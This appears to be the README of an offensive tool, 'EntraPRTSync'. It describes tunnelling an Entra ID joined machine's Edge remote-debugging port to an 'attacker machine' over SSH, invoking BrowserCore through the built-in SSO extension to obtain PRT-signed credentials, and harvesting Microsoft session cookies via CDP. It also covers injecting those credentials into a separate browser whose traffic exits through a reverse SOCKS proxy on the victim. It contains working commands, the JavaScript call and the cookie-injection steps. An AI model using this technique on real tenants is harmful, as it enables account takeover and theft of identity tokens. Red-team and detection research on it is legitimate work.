# TLDR
## On the Entra ID (Azure AD joined) machine:
```
# Start Edge with CDP enabled (do this once, keep it running and signed in)
msedge.exe --remote-debugging-port=9229 --profile-directory="Default"

# Expose its CDP port + a SOCKS exit via SSH reverse tunnels
ssh -R 1080 user@ssh-server
```

## On the attacker machine:
```
ssh -L 9229:localhost:9229 -L 1080:localhost:1080 user@ssh-server

# Basic usage (browser traffic exits via Entra machine through SOCKS)
python cdp_sync.py --entra-cdp-port 9229 --edge-proxy socks5h://127.0.0.1:1080

# With Burp Suite interception (configure Burp's SOCKS Proxy → 127.0.0.1:1080 first)
python cdp_sync.py --entra-cdp-port 9229 --edge-proxy http://127.0.0.1:8080
```

The script will enumerate profiles on the Entra machine and prompt you to select
one for PRT extraction and one for session-cookie import. It then launches a
local Edge, injects cookies + PRT credentials, and watches all tabs indefinitely.

---

# EntraPRTSync— PRT SSO across machines

Use an **Entra ID (Azure AD) joined machine's Primary Refresh Token (PRT)** to
silently authenticate a browser running on a **completely separate, non-joined
machine** — tunnelled through an intermediary SSH server.

---

## Table of contents

1. [Background — what is a PRT?](#1-background--what-is-a-prt)
2. [How AAD browser SSO normally works](#2-how-aad-browser-sso-normally-works)
3. [What this project does differently](#3-what-this-project-does-differently)
4. [Architecture](#4-architecture)
5. [The BrowserCore protocol](#5-the-browsercore-protocol)
6. [CDP-direct PRT extraction](#6-cdp-direct-prt-extraction)
7. [The full authentication flow, step by step](#7-the-full-authentication-flow-step-by-step)
8. [Cookie details](#8-cookie-details)
9. [Chrome DevTools Protocol (CDP) operations](#9-chrome-devtools-protocol-cdp-operations)
10. [SSH tunnel setup](#10-ssh-tunnel-setup)
11. [Component reference](#11-component-reference)
12. [Requirements & installation](#12-requirements--installation)
13. [Troubleshooting](#13-troubleshooting)

---

## 1. Background — what is a PRT?

A **Primary Refresh Token (PRT)** is a long-lived credential (valid ~14 days,
auto-renewed) issued by Microsoft Entra ID (Azure AD) to:

- **Azure AD joined** machines (cloud-only join via Settings → Accounts)
- **Hybrid Azure AD joined** machines (on-premises AD + cloud sync)
- **Azure AD registered** machines (personal devices with a work account added)

Windows stores the PRT in an encrypted blob inside the **Windows Account Manager
(WAM)** credential store. The blob is protected by DPAPI and optionally the TPM,
so the raw token cannot be read or exported by any user-mode process — not even
an Administrator.

The PRT is used to obtain **access tokens** and **refresh tokens** for any tenant
resource without re-prompting the user for credentials. It is essentially the
master key for the logged-in identity on that machine.

---

## 2. How AAD browser SSO normally works

When a browser on a joined machine navigates to an AAD login page, the following
happens automatically (this is called **Browser SSO via PRT**):

```
Browser                    AAD (login.microsoftonline.com)       BrowserCore.exe
   |                                    |                               |
   |  GET /authorize?...&sso_nonce=XYZ  |                               |
   |------------------------------------►                               |
   |                                    |                               |
   |  HTTP 302  (redirect with          |                               |
   |   ?sso_reload=true&sso_nonce=XYZ)  |                               |
   |◄------------------------------------                               |
   |                                    |                               |
   |  [browser detects sso_reload URL]  |                               |
   |  calls NativeMessaging extension --+------------------------------►|
   |                                    |  GetCookies(url, nonce)       |
   |                                    |                               | WAM/TPM
   |                                    |                               | signs JWT
   |◄-----------------------------------+-------------------------------|
   |  cookie: x-ms-RefreshTokenCredential=<signed-JWT>                  |
   |                                    |                               |
   |  GET /authorize (same URL + cookie)|                               |
   |------------------------------------►                               |
   |                                    | validates JWT, issues tokens  |
   |◄------------------------------------                               |
   |  302 → redirect_uri (signed in)    |                               |
```

The key component is **BrowserCore.exe** — a native messaging host registered
for both Chrome and Edge. The browser's built-in AAD extension calls it via
Chrome NativeMessaging (stdin/stdout with a 4-byte length prefix) to get the
signed credential cookie. BrowserCore is the only process with access to WAM,
which holds the PRT.

On a **non-joined machine**, this whole flow fails silently because:
- There is no PRT
- BrowserCore is not installed (or has no PRT to work with)
- AAD falls through to interactive login

---

## 3. What this project does differently

Instead of running a separate agent on the Entra machine, we connect **directly
to the Chrome DevTools Protocol (CDP) endpoint of Edge on the Entra machine**
through an SSH tunnel. The built-in Windows SSO extension (`ppnbnpeolgkicgegkbkbjmhlideopiji`)
that ships with Edge already calls BrowserCore internally — we simply wake its
service worker and invoke it via `Runtime.evaluate` over CDP.

Steps at a high level:

1. The user runs Edge on the Entra machine with `--remote-debugging-port=XXXX`
   and keeps it signed in.
2. Both the CDP port and a SOCKS5 exit are tunnelled to the attacker machine via
   SSH.
3. On the attacker machine, `cdp_sync.py` enumerates Edge profiles on the Entra
   machine, wakes the SSO extension's service worker in the correct profile,
   evaluates a `chrome.runtime.connectNative('com.microsoft.browsercore')` call
   inside the worker via CDP, and receives the signed PRT credential.
4. The signed credential (a short-lived JWT tied to the current `sso_nonce`) is
   injected into a locally-running Edge via CDP, and the AAD authorize URL is
   re-navigated — completing SSO on the non-joined machine.

The PRT still never leaves the Entra machine. Only the short-lived signed-JWT
cookie (valid for a single nonce, expires in ~2 minutes) crosses the network.

---

## 4. Architecture

```
+---------------------------------------------+
|            Entra ID machine                 |
|                                             |
|  msedge.exe --remote-debugging-port=9229    |
|    |  (signed in, SSO extension active)     |
|    +--► built-in SSO ext service worker     |
|              |                              |
|              +--► BrowserCore.exe           |
|                       |                     |
|                       +--► WAM / TPM        |
|                              (PRT stored)   |
|                                             |
|  Listening: 127.0.0.1:9229 (CDP)            |
+---+-----------------------------------------+
    |  ssh -R 9229:127.0.0.1:9229   (forward CDP port to SSH server)
    |  ssh -R 1080                  (reverse dynamic SOCKS — exits via Entra)
    v
+----------------------------------+
|           SSH server             |
|                                  |
|  TCP :9229  -->  Entra CDP       |
|  TCP :1080  -->  SOCKS5 proxy    |
|              (exits via Entra)   |
+---+------------------------------+
    |  ssh -L 9229:localhost:9229
    |  ssh -L 1080:localhost:1080
    v
+--------------------------------------------+
|             Attacker machine               |
|                                            |
|  cdp_sync.py --entra-cdp-port 9229         |
|    |  connects to 127.0.0.1:9229 (Entra    |
|    |    CDP) through SOCKS tunnel           |
|    |  wakes SSO ext SW via ServiceWorker   |
|    |    CDP domain                         |
|    |  evaluates connectNative() in SW via  |
|    |    Runtime.evaluate -> PRT creds      |
|    |  harvests ESTS session cookies via    |
|    |    Network.getAllCookies on Entra Edge |
|    |                                       |
|    |  launches local Edge on CDP :9224     |
|    |  injects session cookies + PRT creds  |
|    |  watches tabs -> injects on demand    |
|    +--► local Edge (CDP port 9224)         |
|           --load-extension=WinAccountsExt  |
|           --proxy-server=socks5://1080     |
+--------------------------------------------+
```

---

## 5. The BrowserCore protocol

BrowserCore.exe uses the **Chrome NativeMessaging** wire format:

- Communication is over **stdin/stdout**
- Each message is prefixed with a **4-byte little-endian uint32** length header
- The payload is a **UTF-8 JSON string**

### Request (SSO extension → BrowserCore)

```json
{
  "method": "GetCookies",
  "sender": "https://login.microsoftonline.com",
  "uri": "<the full AAD authorize URL>"
}
```

- `sender` must be `https://login.microsoftonline.com` — BrowserCore validates
  the caller's origin.
- `uri` is the full authorize URL including `sso_nonce`. BrowserCore extracts
  the nonce and binds the credential JWT to it, preventing replay attacks.

### Response (BrowserCore → SSO extension)

**Success:**
```json
{
  "response": [
    {
      "name": "x-ms-RefreshTokenCredential",
      "data": "<base64url-encoded signed JWT>",
      "p3pHeader": "...",
      "flags": 8264
    },
    {
      "name": "x-ms-DeviceCredential",
      "data": "<base64url-encoded device cert JWT>",
      "p3pHeader": "...",
      "flags": 8200
    }
  ]
}
```

Two credentials are typically returned:

| Cookie | JWT algorithm | Purpose |
|---|---|---|
| `x-ms-RefreshTokenCredential` | HS256 (keyed with PRT session key) | Primary SSO credential |
| `x-ms-DeviceCredential` | RS256 (signed with device cert private key) | Device compliance assertion |

Only the first one (`x-ms-RefreshTokenCredential`) is required for SSO.

**Error:**
```json
{
  "status": "Fail",
  "code": "OSError",
  "description": "Error processing request.",
  "ext": { "error": -2147186938 }
}
```

Common error codes:

| Code (hex) | Decimal | Meaning |
|---|---|---|
| `0x80048706` | -2147186938 | No PRT available (not joined, wrong user context, or elevated shell) |
| `0x8004BF00` | -2147155200 | BrowserCore internal error |

**Important:** BrowserCore accesses the PRT through the **current user's WAM
store**. Running Edge (and therefore the SSO extension) in an elevated
(Administrator) shell creates a different security token context — the elevated
token has no PRT. Always run Edge as a normal (non-elevated) user.

---

## 6. CDP-direct PRT extraction

`cdp_sync.py` drives PRT extraction entirely through the Entra machine's Edge
CDP endpoint — no separate agent process is needed on the Entra machine.

### Step-by-step

```
cdp_sync.py
  |
  +-- GET http://127.0.0.1:<entra-cdp-port>/json/version
  |     (via SOCKS tunnel)
  |     -> { "webSocketDebuggerUrl": "ws://127.0.0.1:<port>/devtools/browser/..." }
  |
  +-- BrowserLevelCDPSession(browser_ws)
  |
  +-- Target.setDiscoverTargets(true)        wake dormant service workers
  +-- Target.getTargets                      enumerate all profiles' page targets
  +-- Group by browserContextId              -> one page per profile
  |
  +-- For each profile page:
  |     CDPSession(page_ws)
  |     ServiceWorker.enable
  |     ServiceWorker.startWorker(scope="chrome-extension://ppnbnpeol.../")
  |     -> wakes the built-in SSO extension service worker in that profile
  |
  +-- sleep(1 s)                             let SWs start across all profiles
  +-- Target.getTargets                      re-enumerate -- SW targets now visible
  |
  +-- Filter targets:
  |     exact:   url contains BUILTIN_EXT_ID  (ppnbnpeolgkicgegkbkbjmhlideopiji)
  |     workers: type in (worker, service_worker, background_page)
  |
  +-- For each candidate target (exact first):
        Target.attachToTarget(targetId, flatten=true)  -> sessionId
        Runtime.enable  (wait for ACK)
        Runtime.evaluate(JS_BUILTIN, awaitPromise=true)
          JS: new Promise(resolve =>
                chrome.runtime.connectNative('com.microsoft.browsercore')
                  .postMessage({method:"GetCookies", sender:"https://...", uri: URL})
                  .onMessage(resolve))
        -> on first success: return credentials array
```

### Profile enumeration & selection

At startup `cdp_sync.py` calls `_entra_cdp_get_profiles()`, which:

1. Enumerates all `browserContextId` values from page targets
2. Wakes the SSO extension's service worker in each profile
3. Re-enumerates targets, checks which have `BUILTIN_EXT_ID` in their URL
4. Returns a list of `{ index, label, pages, has_sso_ext }` dicts

The interactive prompt then shows:

```
  Profiles on Entra Edge:
    [1] Default  [SSO extension]
    [2] Work Profile

  [0] None (cookies only — skip PRT extraction)
  Select profile for PRT extraction [0=none, 1-2]:

  [0] None (skip session-cookie import)
  Select profile for cookie import [0=none, 1-2]:
```

- The `[SSO extension]` tag indicates which profile has the built-in SSO
  extension active — pick that one for PRT extraction.
- Pass `--entra-cdp-sso-profile N` / `--entra-cdp-cookie-profile N` on the
  command line to skip the interactive prompts.
- Selecting `[0] None` for PRT extraction switches to **cookies-only mode**.
- Selecting `[0] None` for cookie import skips the session-cookie harvest entirely.

### Cookies-only mode

If PRT extraction is unavailable or undesired, select `[0] None` at the profile
prompt (or pass `--entra-cdp-sso-profile 0` and choose 0 interactively). In
this mode:

- No CDP connection is made to the SSO extension service worker for credentials
- On each AAD authorize URL, `_handle_auth` injects the harvested ESTS session
  cookies directly into the tab via `Network.setCookie` and re-navigates
- `_watch_forever` continues running for the lifetime of the session
- If the Entra machine's session cookies are still valid, AAD will accept them
  and complete auth without a PRT

---

## 7. The full authentication flow, step by step

### Step 0 — Session cookie harvest (startup)

`cdp_sync.py` connects to the Entra Edge CDP, calls `Network.getAllCookies`, and
filters for `*.microsoftonline.com / *.microsoft.com / *.msauth.net` cookies.
These are injected into the local Edge profile before the first navigation, so an
already-valid session skips the PRT flow entirely.

### Step 1 — Local Edge launches

`cdp_sync.py` launches a fresh local Edge instance. Multi-instance support is
handled via lock files in `%TEMP%\browser-proxy-locks\`:

- The **first** instance wipes all `EdgePrtProfile*` profile directories and
  starts on port `9224` with profile `EdgePrtProfile`.
- Subsequent concurrent instances claim the next available slot
  (`EdgePrtProfile_1` / port `9225`, `EdgePrtProfile_2` / port `9226`, etc.)
  without disturbing each other.

Each instance is launched with:

- `--remote-debugging-port=<slot-port>` — CDP on localhost
- `--user-data-dir=<slot-profile>` — isolated persistent profile
- `--proxy-server=socks5://127.0.0.1:<socks-port>` — all browsing via SOCKS
- `--proxy-bypass-list=127.0.0.1;localhost` — CDP traffic stays local
- `--load-extension=WinAccountsExt` — sets `brcap=1` at `document_start`

### Step 2 — PRT credential prefetch

Before opening any tabs, `cdp_sync.py` follows the `myaccount.microsoft.com`
redirect chain through the SOCKS proxy to obtain a live AAD authorize URL (with
a fresh `sso_nonce`), then calls `_entra_cdp_extract` to get PRT credentials
for it. These are injected into the local Edge cookie store so the first
navigation lands directly on the signed-in portal.

### Step 3 — Navigation and `_watch_forever`

The script navigates the first tab to `https://myaccount.microsoft.com/` and
enters `_watch_forever`, which polls `http://127.0.0.1:<port>/json/list` every
100 ms.

Two-level deduplication prevents re-triggering on redirect chains:
- `handled_exact` — `(tab_id, url)` pairs already dispatched (permanent)
- `tab_cooldown` — per-tab 15-second quiet period after each dispatch

Detected URL patterns:
- **AAD authorize** (`login.microsoftonline.com` + `client_id=`) → `_handle_auth`
- **ADFS login page** → `_handle_adfs` (re-injects session cookies, redirects back to AAD)

### Step 4 — `_handle_auth` (PRT mode)

1. Opens a CDP session on the tab; starts a background keepalive thread.
2. Calls `_entra_cdp_extract(ENTRA_CDP_PORT, url)` — wakes the SSO extension
   service worker on the Entra machine and invokes BrowserCore via
   `Runtime.evaluate`.
3. On success: injects the returned credentials + `brcap=1` via
   `Network.setCookie` and re-navigates to the same authorize URL.
4. On failure: falls back to re-injecting the harvested ESTS session cookies.

### Step 4 — `_handle_auth` (cookies-only mode)

1. Opens a CDP session on the tab.
2. Injects all `_session_cookies` via `Network.setCookie`.
3. Re-navigates to the AAD authorize URL.

### Step 5 — AAD validates and signs in

AAD validates the `x-ms-RefreshTokenCredential` JWT:
1. Checks `brcap=1` in cookies.
2. Decodes and verifies the HMAC-SHA256 signature with the PRT session key.
3. Confirms `request_nonce` in the JWT matches `sso_nonce` in the URL.
4. Issues an authorization code and redirects to the app.

### Step 6 — sso_reload second pass (automatic)

AAD sometimes issues a second `sso_reload=true` redirect with a **new nonce**.
Because `_watch_forever` deduplicates by exact URL, the new URL triggers a
fresh `_handle_auth` cycle automatically.

---

## 8. Cookie details

### `x-ms-RefreshTokenCredential`

A **JWT** in compact serialization (`header.payload.signature`), base64url-
encoded. Typically 800–1200 characters.

**Decoded header:**
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "ctx": "<device context opaque string>"
}
```

**Decoded payload:**
```json
{
  "refresh_token": "0.AXXX...",   // the PRT (opaque blob, not useful outside AAD)
  "is_primary": "true",
  "iat": 1708789200,              // issued-at (Unix timestamp)
  "exp": 1708789320,              // expires ~2 minutes after issuance
  "request_nonce": "XYZ...",      // bound to the sso_nonce in the URL
  "win_ver": "10.0.19045.0"       // Windows version of the Entra machine
}
```

**Signature:** HMAC-SHA256 keyed with the **PRT session key**. Only AAD (which
issued the PRT) and WAM on the Entra machine (which holds the session key) can
produce a valid signature. Any tampering or replay with a different nonce will
fail AAD's verification.

### `brcap`

A simple flag cookie (`value=1`). AAD checks for this before doing anything with
the `x-ms-RefreshTokenCredential` cookie. It signals that the browser "has
BrowserCore" and its credential cookie should be trusted. Without it, AAD treats
the credential cookie as absent.

---

## 9. Chrome DevTools Protocol (CDP) operations

CDP is the debug/automation protocol built into all Chromium-based browsers. It
communicates over a **WebSocket** connection using **JSON-RPC 2.0** messages.

### Discovering tabs / targets

```
GET http://127.0.0.1:<port>/json/list
```

Returns an array of target descriptors. A page tab entry looks like:
```json
{
  "type": "page",
  "id": "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  "title": "Sign in to your account",
  "url": "https://login.microsoftonline.com/...",
  "webSocketDebuggerUrl": "ws://127.0.0.1:<port>/devtools/page/XXXX"
}
```

For browser-level operations (waking service workers, attaching to arbitrary
targets), the browser WebSocket URL comes from:
```
GET http://127.0.0.1:<port>/json/version
-> { "webSocketDebuggerUrl": "ws://127.0.0.1:<port>/devtools/browser/..." }
```

### `Network.setCookie`

Injects a cookie into the browser's cookie jar for the specified scope —
equivalent to the server sending `Set-Cookie`, but without any HTTP request.

```json
{
  "method": "Network.setCookie",
  "params": {
    "name":     "x-ms-RefreshTokenCredential",
    "value":    "<JWT value>",
    "domain":   ".login.microsoftonline.com",
    "path":     "/",
    "secure":   true,
    "httpOnly": false,
    "url":      "https://login.microsoftonline.com/"
  }
}
```

### `Page.navigate`

Navigates the tab to the URL. Edge sends the injected cookies in the `Cookie`
header on this request.

### `ServiceWorker.startWorker`

Wakes a terminated MV3 service worker by scope URL. Sent to a **page-level**
CDP session (scoped to a specific tab/profile), so the worker is started in the
correct `browserContextId`.

```json
{
  "method": "ServiceWorker.startWorker",
  "params": { "scopeURL": "chrome-extension://ppnbnpeolgkicgegkbkbjmhlideopiji/" }
}
```

### `Target.attachToTarget` + `Runtime.evaluate`

Attaches to a service worker target by its `targetId` and evaluates JavaScript
inside it, retrieving the return value synchronously via `awaitPromise=true`.
This is the mechanism used to invoke the SSO extension's `connectNative` call.

---

## 10. SSH tunnel setup

Two things must be forwarded to the attacker machine:

| Forward | Purpose |
|---|---|
| Entra Edge CDP port (e.g. 9229) | `cdp_sync.py` connects here to extract PRT creds and harvest session cookies |
| SOCKS5 port 1080 | Local Edge traffic exits via the Entra IP; DNS resolved on Entra side |

### On the Entra ID machine

```powershell
# 1. Start Edge with CDP enabled (non-elevated)
Start-Process msedge.exe "--remote-debugging-port=9229 --profile-directory=Default"

# 2. Forward both the CDP port and a SOCKS exit to the SSH server
ssh -R 9229:127.0.0.1:9229 -R 1080 user@ssh-server
```

`-R 9229:127.0.0.1:9229` forwards the Entra machine's Edge CDP port to the SSH
server.  
`-R 1080` creates a **reverse dynamic SOCKS5 proxy** on the SSH server at port
1080, with traffic exiting via this Entra machine (OpenSSH 7.6+).

### On the attacker machine

```powershell
ssh -L 9229:localhost:9229 -L 1080:localhost:1080 user@ssh-server

# Route browser traffic through Entra (typical pentest setup)
python cdp_sync.py --entra-cdp-port 9229 --entra-cdp-socks 1080 --edge-proxy socks5h://127.0.0.1:1080

# Intercept traffic with Burp (configure Burp: Project options → Connections → SOCKS Proxy → 127.0.0.1:1080)
python cdp_sync.py --entra-cdp-port 9229 --entra-cdp-socks 1080 --edge-proxy http://127.0.0.1:8080
```

`-L 9229:localhost:9229` brings the Entra CDP port to `127.0.0.1:9229` locally.  
`-L 1080:localhost:1080` brings the SOCKS proxy to `127.0.0.1:1080` locally.

With these flags:
- `cdp_sync.py` uses `socks5h://127.0.0.1:1080` (`--entra-cdp-socks`) to reach the Entra CDP, so DNS resolves on the Entra side
- Local Edge is launched with `--proxy-server=<--edge-proxy value>`
- Local Edge CDP on `127.0.0.1:9224` is excluded via `--proxy-bypass-list`

**If `--edge-proxy` is omitted**, the script will warn that browser traffic
will exit via your local internet connection (not the Entra machine) and ask
for confirmation before proceeding.

**If an HTTP proxy is given** (e.g. Burp Suite), the script will remind you to
configure Burp's SOCKS proxy (`Project options → Connections → SOCKS Proxy →
127.0.0.1:<socks-port>`) so that Burp's outbound traffic still exits via the
Entra machine.

---

## 11. Component reference

| File | Machine | Purpose |
|---|---|---|
| `cdp_sync.py` | Attacker | Main daemon — launches local Edge, extracts PRT via Entra CDP, watches tabs |
| `WinAccountsExt/` | Attacker | Unpacked Edge extension — sets `brcap=1` at `document_start` |
| `_cdp_diag.py` | Attacker | Diagnostic tool — dumps cookies, tab state, and 30 s of CDP events |
| `EdgeClone/` | Attacker | Helper for Edge profile management |
| `ExtInstaller/` | Attacker | Helper to install `WinAccountsExt` |
| `requirements.txt` | Attacker | Python dependencies |

### `cdp_sync.py` — key CLI arguments

| Argument | Default | Description |
|---|---|---|
| `--entra-cdp-port N` | *(required)* | CDP port of the Entra machine's Edge |
| `--entra-cdp-sso-profile N` | 0 (prompt) | Profile index for PRT extraction (1-based); 0 = prompt interactively |
| `--entra-cdp-cookie-profile N` | 0 (prompt) | Profile index for session-cookie harvest; 0 = prompt, -1/`[0] None` = skip |
| `--entra-cdp-socks N` | 1080 | Local SOCKS5 port used by the script to reach Entra CDP (builds `socks5h://127.0.0.1:N`) |
| `--edge-proxy URL` | *(none)* | Proxy URL passed to local Edge `--proxy-server`. Omitting this prompts a warning that browser traffic won't exit via Entra. Examples: `socks5h://127.0.0.1:1080`, `http://127.0.0.1:8080` |

### `WinAccountsExt`

A minimal MV3 Edge extension loaded unpacked via `--load-extension`. Its content
script (`content.js`) runs at `document_start` on every `https://*` page and
sets:

```js
document.cookie = "brcap=1; domain=.login.microsoftonline.com; path=/; ...";
```

This ensures the capability flag is present before AAD's `BssoInterrupt_Core.js`
reads it on the *first* page load — before any CDP injection has occurred.

### `_cdp_diag.py`

Diagnostic script. Run while `cdp_sync.py` has local Edge open on port 9224:

```
python _cdp_diag.py [--port 9224]
```

Output:
1. **Tabs** — all open page tabs with URLs
2. **ESTS cookies** — `ESTSAUTHPERSISTENT` / `ESTSAUTH` validity and TTL
3. **JS evaluation** — signed-in account from portal tab
4. **All cookies** for `login.microsoftonline.com` and `portal.azure.com`
5. **Live CDP events** — 30-second capture of console errors, JS exceptions,
   network failures, and HTTP 3xx/4xx/5xx responses

---

## 12. Requirements & installation

### Attacker machine

- Python 3.8+
- Microsoft Edge installed at default path

```
pip install -r requirements.txt
```

`requirements.txt`:
```
requests[socks]
websocket-client
```

`requests[socks]` pulls in PySocks which is required for `socks5h://` proxy
support. Without it, DNS is resolved locally rather than on the Entra machine,
which breaks `*.microsoftonline.com` connectivity.

### Entra ID machine

- Windows (any version with Entra join)
- Edge running with `--remote-debugging-port=XXXX` as a **non-elevated** user
  (Administrator context has no PRT)
- No additional software required

---

## 13. Troubleshooting

### SSO extension not detected in any profile

The service worker may not have started yet. Try navigating to a Microsoft page
in the Entra Edge browser to wake it, then re-run `cdp_sync.py`. You can also
manually select the profile when prompted.

### `No worker/service-worker targets found on Entra Edge CDP`

Edge on the Entra machine is running but the SSO extension service worker could
not be woken. Check:
- The correct profile is selected (one that is signed into a work/school account)
- Edge is running non-elevated
- The built-in SSO extension (`ppnbnpeolgkicgegkbkbjmhlideopiji`) is enabled in
  `edge://extensions` on the Entra machine

### `Cannot reach Entra Edge CDP via SOCKS`

The SSH tunnels are not up or not configured correctly. Verify:
```powershell
# On attacker — check CDP port forward
Test-NetConnection -ComputerName 127.0.0.1 -Port 9229

# On attacker — check SOCKS proxy
Test-NetConnection -ComputerName 127.0.0.1 -Port 1080
```

Also confirm Edge on the Entra machine was started with
`--remote-debugging-port=9229` (or whichever port you forwarded).

### `BrowserCore error: {"status":"Fail","code":"OSError","ext":{"error":-2147186938}}`

The Entra machine's Edge is running as an elevated (Administrator) process. The
elevated token has no PRT. Restart Edge from a non-elevated shell.

### `[CONSOLE ERROR] Token was not obtained {"code":"NoExtension",...}`

AAD could not find `x-ms-RefreshTokenCredential`. Either `brcap` was missing on
the first page load or the credential expired before injection. The
`WinAccountsExt` extension prevents the first scenario. If it still occurs,
check that the extension is loading in `edge://extensions` while a debug session
is open.

### Multiple instances interfering with each other

Each instance of `cdp_sync.py` claims its own lock file in
`%TEMP%\browser-proxy-locks\` and gets an isolated Edge profile + CDP port
(first: `EdgePrtProfile` / 9224, second: `EdgePrtProfile_1` / 9225, etc.). Lock
files are cleaned up automatically on exit via `atexit`. If stale lock files
remain after a crash, delete `%TEMP%\browser-proxy-locks\` manually.

### Portal tab not detected / watcher stuck

If `_watch_forever` is not triggering on an AAD login page, confirm the URL
contains both `login.microsoftonline.com` as the hostname and `client_id=` in
the query string. Open `_cdp_diag.py` to see current tab URLs and live CDP
events in real time.

